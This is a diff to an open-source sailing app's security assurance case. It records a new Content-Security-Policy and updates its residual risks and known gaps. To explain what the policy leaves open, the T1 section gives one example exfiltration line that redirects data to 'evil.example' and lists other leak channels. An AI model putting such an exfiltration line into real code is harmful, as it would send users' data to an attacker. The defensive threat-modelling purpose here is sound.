@@ -1,7 +1,7 @@
 # SailCommand security assurance case
 
-**Status:** current as of 2026-07-27, describing `develop` at the time of
-writing. Reviewed at each release cut.
+**Status:** current as of 2026-08-03, describing `develop` at the time of
+writing (`v0.7.0` cut). Reviewed at each release cut.
 **Audience:** users deciding whether to trust the app, and reviewers assessing
 the project (this document is the artifact for the OpenSSF Best Practices
 `assurance_case` criterion).
@@ -108,12 +108,21 @@ ecosystems plus Dependabot security updates, CodeQL on every push and pull
 request, GitHub secret scanning with push protection, a committed third-party
 notices inventory whose drift fails CI, and human review of every dependency
 bump (nothing merges automatically).
-**Residual risk: real.** No CSP restricts where a compromised bundle could send
-data ([#223](https://github.com/DocGerd/sail_command/issues/223) — the single
-most valuable open mitigation for this threat), and dependency review is one
-person reading a diff. Partially bounded by the app holding little worth
-stealing: no credentials except an optional AIS key the user supplies and can
-revoke.
+**Residual risk: reduced, not eliminated.** A `<meta http-equiv>`
+Content-Security-Policy ([#223](https://github.com/DocGerd/sail_command/issues/223))
+now restricts `connect-src` to `'self'`, Open-Meteo, and aisstream.io — a
+compromised bundle cannot make **background requests** (fetch/XHR/WebSocket/
+`sendBeacon`) to an arbitrary origin. `connect-src` governs only that traffic
+class; it does not restrict top-level navigation (`location.href =
+'https://evil.example/?d=' + data` — CSP3's `navigate-to` directive was never
+shipped in browsers), `window.open`, `<link rel="dns-prefetch"/"preconnect">`,
+or WebRTC (no `webrtc` directive is set, and WebRTC does **not** fall back to
+`default-src`) — all remain viable, if noisier, exfiltration channels, and
+exfiltration to the three already-allowed destinations (e.g. abusing the
+Open-Meteo connection as a covert channel) is also unrestricted. Dependency
+review is still one person reading a diff. Partially bounded by the app
+holding little worth stealing: no credentials except an optional AIS key the
+user supplies and can revoke.
 
 ### T2 — Hostile GPX import
 
@@ -277,9 +286,12 @@ would have been dropped still errors honestly.
 pull-request-only merges (merge commits only), required `app` + `e2e` checks
 under a strict up-to-date policy, mandatory review-thread resolution, no force
 pushes, no deletions. CI runs lint → typecheck → tests → build, plus a
-third-party notices drift guard. Production is built from `main` only and
-double-built as a determinism proof; a byte difference fails the run. Every
-GitHub Action is pinned to a full commit SHA.
+third-party notices drift guard. `pipeline/`'s Python is separately linted and
+formatted with ruff in `.github/workflows/python-lint.yml` (job `ruff`) — an
+optional check, not part of `protect-main`'s required `app` + `e2e` set.
+Production is built from `main` only and double-built as a determinism proof;
+a byte difference fails the run. Every GitHub Action is pinned to a full
+commit SHA.
 
 ### 5.5 Defense in depth where it is cheap
 
@@ -301,7 +313,7 @@ place to occur, not that it was judged unlikely.
 | **A02 Cryptographic failures** | Countered | The project implements no cryptography. All transport is TLS (HTTPS to Open-Meteo and Pages, WSS to aisstream.io) with default certificate verification and no bypass anywhere in the code. No cleartext protocol is supported. The only credential is the user's own AIS key — never committed, replaceable at runtime with no rebuild |
 | **A03 Injection** (CWE-79 XSS, CWE-89 SQLi, CWE-611 XXE) | Countered | No SQL and no server-side interpreter. XSS: no `innerHTML` / `dangerouslySetInnerHTML` / `eval` / `new Function` anywhere; React escapes by default. XXE: `DOMParser` with `application/xml` does not resolve external entities. CodeQL's `js/xss-through-dom` alert on that parse is a **documented false positive** — its DOM-XSS sink model is mime-insensitive, while an `application/xml` parse is inert and the parser extracts only numeric coordinates and enumerated notices |
 | **A04 Insecure design** | Countered | This document is the design argument; see [§5](#5-secure-design-argument). Threats were considered against the architecture, and the largest control is architectural: no backend, no accounts, no central data |
-| **A05 Security misconfiguration** | **Partially countered** | Minimal workflow permissions, SHA-pinned actions, protected branches, secret scanning with push protection, no debug endpoints, static hosting. **But: the app ships no Content-Security-Policy and no referrer policy** ([#223](https://github.com/DocGerd/sail_command/issues/223)). GitHub Pages cannot set response headers, but a `<meta http-equiv>` CSP is available and currently unused. This is the clearest open weakness in the app |
+| **A05 Security misconfiguration** | Countered | Minimal workflow permissions, SHA-pinned actions, protected branches, secret scanning with push protection, no debug endpoints, static hosting. GitHub Pages cannot set response headers, so the app injects a `<meta http-equiv="Content-Security-Policy">` at build time (`cspMeta()` in `app/vite.config.ts`) with `default-src 'self'`, a `connect-src` allowlist of `'self'` plus Open-Meteo and aisstream.io, `worker-src 'self'` (no `blob:` — it would defeat `script-src 'self'`), `img-src` widened to `data:`/`blob:` where maplibre-gl 6 demonstrably needs it, and no `'unsafe-inline'`/`'unsafe-eval'`, plus the static `<meta name="referrer" content="strict-origin-when-cross-origin">` already present in `app/index.html` ([#223](https://github.com/DocGerd/sail_command/issues/223)). The meta form cannot express `frame-ancestors` or `report-uri` — accepted, static host with no framing threat model and no collector |
 | **A06 Vulnerable and outdated components** (CWE-1104) | Countered | Lockfiles for every ecosystem; Dependabot across five ecosystems weekly plus security updates; zero open Dependabot alerts at the time of writing; a committed third-party notices inventory whose drift fails CI; no vendored or forked convenience copies |
 | **A07 Identification and authentication failures** | N/A by architecture | There is no authentication. No accounts, no passwords, no sessions, no password reset, nothing to brute-force |
 | **A08 Software and data integrity failures** (CWE-502) | **Partially countered** | Reproducible double-build with byte-drift gating, SHA-pinned actions, protected branches, post-deploy smoke probe. No untrusted deserialization: IndexedDB uses structured clone of the app's own records, and a corrupt record is isolated to its own row rather than blanking the list. **But releases and tags are unsigned** ([#222](https://github.com/DocGerd/sail_command/issues/222)), so downstream verification is not possible |
@@ -319,10 +331,10 @@ Listing these is part of the argument's honesty, not an aside.
 
 | Gap | Impact | Status |
 |---|---|---|
-| No Content-Security-Policy or referrer policy | A compromised dependency faces no egress restriction (raises the impact of [T1](#t1--supply-chain-compromise-of-a-bundled-dependency)) | Open — [#223](https://github.com/DocGerd/sail_command/issues/223) |
-| Releases and tags unsigned | Downstream cannot verify authenticity ([T5](#t5--tampering-between-the-repository-and-the-users-browser)) | Open — [#222](https://github.com/DocGerd/sail_command/issues/222) |
-| Statement coverage unmeasured | The test suite is substantial and CI-gated, but no coverage figure is claimed because none is measured | Open — [#221](https://github.com/DocGerd/sail_command/issues/221) |
-| No Python linter or formatter for `pipeline/` | Build-time code only, never runs for users; still an unenforced-standards gap | Open — [#220](https://github.com/DocGerd/sail_command/issues/220) |
+| CSP meta form cannot express `frame-ancestors`/`report-uri` | No framing protection and no automated violation reporting | Accepted — [#223](https://github.com/DocGerd/sail_command/issues/223); static host, no framing threat model in play, no collector to report to |
+| `connect-src` restricts background requests only — top-level navigation, `window.open`, DNS-prefetch/preconnect, and WebRTC are unrestricted | A compromised bundle can still exfiltrate via a `location.href` redirect, a popup, prefetch/preconnect hints, or a WebRTC data channel (raises the impact of [T1](#t1--supply-chain-compromise-of-a-bundled-dependency)) | Accepted — [#223](https://github.com/DocGerd/sail_command/issues/223); CSP3's `navigate-to` directive was never shipped in browsers, and WebRTC has no `default-src` fallback to restrict it with |
+| Releases and tags unsigned | Downstream cannot verify authenticity ([T5](#t5--tampering-between-the-repository-and-the-users-browser)) | Accepted, planned — [#222](https://github.com/DocGerd/sail_command/issues/222) shipped the verification docs and process (`SECURITY.md`, `CONTRIBUTING.md`); no tag through `v0.7.0` is signed, and signing itself starts at `v0.8.0`; signing work tracked in [#322](https://github.com/DocGerd/sail_command/issues/322) |
+| Statement coverage is measured but not enforced | A coverage regression would not fail CI; the figure is a snapshot, not a floor | Open — tracked by [#319](https://github.com/DocGerd/sail_command/issues/319); [#221](https://github.com/DocGerd/sail_command/issues/221) delivered the measurement (93.92% statements, `npm --prefix app run test:coverage`, 2026-08-03), not the gate |
 | Bus factor is 1 | No second person can review, merge, release, or respond to a report | Structural — [`GOVERNANCE.md`](../GOVERNANCE.md#continuity-and-succession) |
 | GitHub Pages CDN is trusted | A CDN compromise would serve modified bytes; no subresource integrity is possible for the entry document | Accepted — inherent to static hosting |
 | Local device compromise | Out of scope; see [T6](#t6--local-attacker-with-access-to-the-device) | Accepted, documented |
